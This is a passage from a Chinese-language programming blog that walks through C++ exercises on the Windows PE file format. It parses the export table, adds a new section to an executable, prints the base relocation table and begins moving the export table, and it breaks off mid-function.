(PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">		<span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">		<span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i = <span class="number">0</span>;</span><br><span class="line">		DWORD j = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		DWORD a = (DWORD)Fun_Name;</span></span><br><span class="line"><span class="comment">		LPSTR* c = &amp;Fun_Name;</span></span><br><span class="line"><span class="comment">		DWORD b = RVAToFOA(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer;</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%x\n&quot;,Fun_Name);//输出Fun_Name中的值，即字符串的地址</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%p\n&quot;,Fun_Name);//输出Fun_Name中的值，而非Fun_Name地址，即字符串的地址</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%p\n&quot;,c);</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%x\n&quot;,b);</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%s\n&quot;,b);//将b的整数作为地址去找该地址指向的内容</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%s\n&quot;,Fun_Name);//输出同上一行</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>((LPSTR)<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,Fun_Name))</span><br><span class="line">			&#123; </span><br><span class="line">				i = AddrOrdinals[j];</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;导出序号0x%x 对应的导出函数名为 %s ，该函数RVA为：%x\n&quot;</span>,AddrOrdinals[j] + pExportDirectory-&gt;Base,<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,AddrFunctions[i]);</span><br><span class="line">				<span class="keyword">return</span> (PDWORD)AddrFunctions[i];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;不存在该导出函数\n&quot;</span>);</span><br><span class="line">	<span class="comment">//return (PDWORD)AddrFunctions[i];</span></span><br><span class="line"></span><br><span class="line">	&#125;<span class="comment">//end else&#123;</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//end GetFunctionAddrByName(PVOID pFileBuffer, LPSTR fun_name)</span></span><br></pre></td></tr></table></figure>



<h2 id="E-AddNewSection"><a href="#E-AddNewSection" class="headerlink" title="E AddNewSection"></a>E AddNewSection</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">函数功能：在原PE文件中新增一个节，步骤：</span></span><br><span class="line"><span class="comment">1. 判断SizeOFHeader能否放下多余两个节区（一个新增节区，一个全0节区代表区块结束），分三种情况：</span></span><br><span class="line"><span class="comment"> （1）已有节表后直接可以放下两个节表 （2）条件满足（1），但是最后一个节表后面的数据非0x00则执行（3）；</span></span><br><span class="line"><span class="comment"> （3）节表后放不下，但是dos头后pe前可放下；（4）前两种情况都不行，需扩大最后一个节把代码填进去 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2. 本函数讨论第一种情况</span></span><br><span class="line"><span class="comment">1) 修改PE头中节的数量（NumberOfSections）</span></span><br><span class="line"><span class="comment">2) 修改sizeOfImage的大小</span></span><br><span class="line"><span class="comment">3) 修正新增节表的所有属性</span></span><br><span class="line"><span class="comment">4) 添加一个新的节表(可以copy一份然后修改)</span></span><br><span class="line"><span class="comment">5) 在新增节表后面填充一个节表大小的0x00</span></span><br><span class="line"><span class="comment">6）在原有数据的最后，新增一个节的数据(内存对齐的整数倍).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">参数1：新增节的大小。参数2：新增节的NewSection_FileBuffer。参数3：新增节的名字</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="comment">//参数为新增节的大小</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> IMAGE_SIZEOF_SECTION_HEADER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SECTION_HEADER 40 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="function">VOID <span class="title">AddNewSection</span><span class="params">(DWORD Add_Section_Length,LPVOID* NewSection_FileBuffer,LPSTR Add_Section_Name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS32 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID pFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID pTempFileBuffer = <span class="literal">NULL</span>;<span class="comment">//新的FileBuffer，之后再写入新文件</span></span><br><span class="line"></span><br><span class="line">	pFileBuffer = <span class="built_in">ReadPEFile</span>(FILEPATH);</span><br><span class="line">	DWORD fileSize = <span class="built_in">ReadPESize</span>(FILEPATH);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;AddNewSection文件大小为：0x%x\n&quot;</span>,fileSize);</span><br><span class="line">	<span class="keyword">if</span>(pFileBuffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;文件 --&gt; 文件缓冲区失败&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	pTempFileBuffer = <span class="built_in">malloc</span>(fileSize + Add_Section_Length);</span><br><span class="line">	<span class="keyword">if</span>(pTempFileBuffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;临时文件缓冲区申请失败&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(pTempFileBuffer, <span class="number">0</span>, fileSize + Add_Section_Length);</span><br><span class="line">	<span class="built_in">memcpy</span>(pTempFileBuffer, pFileBuffer, fileSize);<span class="comment">//全部拷进去</span></span><br><span class="line"> </span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pTempFileBuffer;</span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS32)((BYTE *)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line"> </span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	<span class="comment">//保存text节的属性后面复制给新增节的属性</span></span><br><span class="line">	PIMAGE_SECTION_HEADER pText_Section = pSectionHeader;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断SizeOfHeaders - 已使用的头的大小 &gt;= 2*IMAGE_SIZEOF_SECTION_HEADER</span></span><br><span class="line">	<span class="comment">//#define  IMAGE_SIZEOF_SECTION_HEADER   40</span></span><br><span class="line">	<span class="comment">//已使用的头的大小 = DOS(0x3C + 0x4) + 垃圾数据 + PE标记(0x4) + 标准PE头(0x14) + 可选PE头</span></span><br><span class="line">	<span class="comment">//(pFileHeader-&gt;SizeOfOptionalHeader) + 已存在节表(pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER)</span></span><br><span class="line">	<span class="comment">//已使用的头的大小 = (DWORD)pSectionHeader - (DWORD)PIMAGE_DOS_HEADER + pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//已有节表后剩余的空间大小</span></span><br><span class="line">	DWORD Test = pOptionHeader-&gt;SizeOfHeaders - ((DWORD)pSectionHeader - (DWORD)pDosHeader + pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;已有节表后剩余的空间大小：%d\n&quot;</span>,Test);</span><br><span class="line">	<span class="keyword">if</span>(pOptionHeader-&gt;SizeOfHeaders - ((DWORD)pSectionHeader - (DWORD)pDosHeader + pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER) &gt;= <span class="number">2</span>*IMAGE_SIZEOF_SECTION_HEADER)	</span><br><span class="line">	&#123;	<span class="comment">//应该还有一个判断条件就是最后一个节表后面的数据是否是0x00？</span></span><br><span class="line">		<span class="comment">//1) 修改PE头中节的数量（NumberOfSections）</span></span><br><span class="line">		pFileHeader-&gt;NumberOfSections = pFileHeader-&gt;NumberOfSections + <span class="number">1</span>;</span><br><span class="line">		<span class="comment">//2) 修改sizeOfImage的大小</span></span><br><span class="line">		pOptionHeader-&gt;SizeOfImage = pOptionHeader-&gt;SizeOfImage + Add_Section_Length;</span><br><span class="line">		<span class="comment">//将指针指向新增节表的首地址</span></span><br><span class="line">		pSectionHeader += pFileHeader-&gt;NumberOfSections - <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">	DWORD SizeOfData = <span class="number">0</span>;</span><br><span class="line">	DWORD MaxSize = <span class="number">0</span>;</span><br><span class="line"> 		</span><br><span class="line"> 		<span class="comment">//3）修正新增节表属性1--Name（总共9个属性）</span></span><br><span class="line">		<span class="built_in">strcpy</span>((<span class="keyword">char</span> *)pSectionHeader-&gt;Name, Add_Section_Name);</span><br><span class="line">		<span class="comment">//3）属性2--Misc.VirtualSize</span></span><br><span class="line">		pSectionHeader-&gt;Misc.VirtualSize = Add_Section_Length;</span><br><span class="line">		<span class="comment">//3）属性3--VirtualAddress，取Misc.VirtualSize与SizeOfRawData的最大值，且为pOptionHeader-&gt;SectionAlignment的倍数</span></span><br><span class="line">		MaxSize = (pSectionHeader - <span class="number">1</span>)-&gt;Misc.VirtualSize &gt; (pSectionHeader - <span class="number">1</span>)-&gt;SizeOfRawData?(pSectionHeader - <span class="number">1</span>)-&gt;Misc.VirtualSize:(pSectionHeader - <span class="number">1</span>)-&gt;SizeOfRawData;</span><br><span class="line">	<span class="keyword">if</span>(MaxSize % pOptionHeader-&gt;SectionAlignment == <span class="number">0</span>)&#123;</span><br><span class="line">		SizeOfData = MaxSize / pOptionHeader-&gt;SectionAlignment * pOptionHeader-&gt;SectionAlignment;<span class="comment">//不够一个块的取一个块的大小(如0x112/0x1000) + 0x1000 = 0x1000</span></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		SizeOfData = MaxSize / pOptionHeader-&gt;SectionAlignment * pOptionHeader-&gt;SectionAlignment + pOptionHeader-&gt;SectionAlignment;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//由于新增节数据是在已有的最后一个节后加的，故起始地址为上一个节的大小</span></span><br><span class="line">	pSectionHeader-&gt;VirtualAddress = (pSectionHeader - <span class="number">1</span>)-&gt;VirtualAddress + SizeOfData;</span><br><span class="line">	<span class="comment">//3）属性4--SizeOfRawData</span></span><br><span class="line">	pSectionHeader-&gt;SizeOfRawData = Add_Section_Length;</span><br><span class="line">	<span class="comment">//3）属性5--PointerToRawData</span></span><br><span class="line">	pSectionHeader-&gt;PointerToRawData = (pSectionHeader - <span class="number">1</span>)-&gt;PointerToRawData + (pSectionHeader - <span class="number">1</span>)-&gt;SizeOfRawData;</span><br><span class="line">	<span class="comment">//3）属性6--Characteristics</span></span><br><span class="line">	pSectionHeader-&gt;Characteristics = pText_Section-&gt;Characteristics;<span class="comment">//text节的属性，其余属性为0</span></span><br><span class="line"> </span><br><span class="line">	<span class="built_in">NewFileBufferToFile</span>(pTempFileBuffer,fileSize + Add_Section_Length,FilePath_Out);</span><br><span class="line">	&#125;</span><br><span class="line">	*NewSection_FileBuffer = pTempFileBuffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="F-Print-Relocation"><a href="#F-Print-Relocation" class="headerlink" title="F Print_Relocation"></a>F Print_Relocation</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************	</span></span><br><span class="line"><span class="comment">打印重定位表</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">BOOL <span class="title">Print_Relocation</span><span class="params">( LPVOID pFileBuffer )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS32 pNtHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_BASE_RELOCATION pBaseRelocation = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	DWORD Size = <span class="number">0</span>;</span><br><span class="line">	DWORD i = <span class="number">0</span>;</span><br><span class="line">	DWORD FOA=<span class="number">0</span>;</span><br><span class="line">	DWORD RVA=<span class="number">0</span>;</span><br><span class="line">	DWORD NumberOfRelocationAddress = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//注意是两字节型的指针</span></span><br><span class="line">	PWORD pRelocation = <span class="literal">NULL</span>;<span class="comment">//指向重定位表中需要重定位的地址的指针</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pFileBuffer ==<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pFileBuffer缓冲区指针出错...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//判断是否含有有效MZ和PE标志</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的MZ标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((BYTE *)pFileBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pNtHeader = (PIMAGE_NT_HEADERS32)( (DWORD)pDosHeader + pDosHeader-&gt;e_lfanew );</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)( (DWORD)pNtHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)( (DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER );</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//pDataDirectory = (PIMAGE_DATA_DIRECTORY)&amp;pDataDirectory[5];</span></span><br><span class="line">	<span class="comment">//pBaseRelocation = (PIMAGE_BASE_RELOCATION)( (DWORD)pDosHeader + </span></span><br><span class="line">	<span class="comment">//ConvertRvaToFoa(pDataDirectory-&gt;VirtualAddress , pFileBuffer));</span></span><br><span class="line">	</span><br><span class="line">	pDataDirectory = (PIMAGE_DATA_DIRECTORY)pOptionHeader-&gt;DataDirectory ;</span><br><span class="line">	<span class="keyword">if</span>(pDataDirectory[<span class="number">5</span>].VirtualAddress == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在基址重定位表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pBaseRelocation	= (PIMAGE_BASE_RELOCATION)( (DWORD)pDosHeader + <span class="built_in">RVAToFOA</span>( (&amp;pDataDirectory[<span class="number">5</span>])-&gt;VirtualAddress , pFileBuffer ) );<span class="comment">//第6个目录表（重定位表的目录）的地址，</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(pBaseRelocation-&gt;VirtualAddress &amp;&amp; pBaseRelocation-&gt;SizeOfBlock)</span><br><span class="line">	&#123;</span><br><span class="line">		pRelocation = (PWORD)( (DWORD)pBaseRelocation + <span class="number">2</span> * <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) );<span class="comment">//指向重定位表中的地址表，#define IMAGE_SIZEOF_BASE_RELOCATION 8	</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;***************************************************************************************\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAddress :%-10x&quot;</span>,pBaseRelocation-&gt;VirtualAddress );</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;SizeOfBlock :%-10X&quot;</span>,pBaseRelocation-&gt;SizeOfBlock );	</span><br><span class="line">		NumberOfRelocationAddress = (pBaseRelocation-&gt;SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION)/<span class="number">2</span> ;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NumberOfRelocationAddress :%-10X\n&quot;</span>, NumberOfRelocationAddress );</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;***************************************************************************************\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; Index			RVA                     Type                   Items\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">		DWORD j = <span class="number">0</span>;</span><br><span class="line">		DWORD x = <span class="number">0</span>;</span><br><span class="line">		DWORD y = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span> ; j&lt;NumberOfRelocationAddress ;j++)<span class="comment">//pRelocation++遍历重定位表中的地址表</span></span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">			x = (DWORD)pRelocation[j]&amp;<span class="number">0xfff</span>;</span><br><span class="line">			y = pBaseRelocation-&gt;VirtualAddress;</span><br><span class="line">			<span class="comment">//printf(&quot;%x			&quot;,x);</span></span><br><span class="line">			<span class="comment">//printf(&quot;%x			&quot;,y);</span></span><br><span class="line">			RVA = x + y;</span><br><span class="line">			<span class="comment">//最后一项如果为0，仅做对齐用</span></span><br><span class="line">			<span class="keyword">if</span>(x == <span class="number">0</span>)</span><br><span class="line">			&#123;	</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d			&quot;</span>, j + <span class="number">1</span> );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;-			&quot;</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x			&quot;</span>, (pRelocation[j]&amp;<span class="number">0xf000</span>)&gt;&gt;<span class="number">12</span> );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d			&quot;</span>, NumberOfRelocationAddress );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//RVA = (DWORD)(pRelocation[j]&amp;0xfff + pBaseRelocation-&gt;VirtualAddress);</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d			&quot;</span>, j + <span class="number">1</span> );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x			&quot;</span>,RVA);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x			&quot;</span>, (pRelocation[j]&amp;<span class="number">0xf000</span>)&gt;&gt;<span class="number">12</span> );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d			&quot;</span>, NumberOfRelocationAddress );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		Size +=pBaseRelocation-&gt;SizeOfBlock;</span><br><span class="line">		</span><br><span class="line">		pBaseRelocation = (PIMAGE_BASE_RELOCATION)( (DWORD)pBaseRelocation + pBaseRelocation-&gt;SizeOfBlock );<span class="comment">//遍历重定位表</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,Size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,(&amp;pDataDirectory[<span class="number">5</span>])-&gt;Size );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="10-Move-Export-Table"><a href="#10-Move-Export-Table" class="headerlink" title="10 Move_Export_Table"></a>10 Move_Export_Table</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">	移动导出表</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">PDWORD <span class="title">Move_Export_Table</span><span class="params">(LPVOID pFileBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS32 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line">	LPSTR New_File_Name = <span class="string">&quot;C:/Move_Export_Table.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS32)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	<span class="comment">//pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + sizeof(DWORD)); </span></span><br><span class="line">	<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">	pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;文件偏移为：%x\n&quot;</span>,<span class="built_in">RVAToFOA</span>(pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress,pFileBuffer));</span><br><span class="line">	<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1）若在源文件上新增一个节并存放移动的导出表数据，该操作失败的话会导致源文件丢失</span></span><br><span class="line">	<span class="comment">//故新建一个TempFileBuffer来使用，包括移动后的导出表也在里面，且不会改变源文件</span></span><br><span class="line">	<span class="comment">//新建文件的大小 = 源文件大小 + 新增节的大小</span></span><br><span class="line">	<span class="comment">//新增节的大小：可由需要被移动节的大小计算得到。本例子指定为0x1000</span></span><br><span class="line">	DWORD Add_Section_Length = 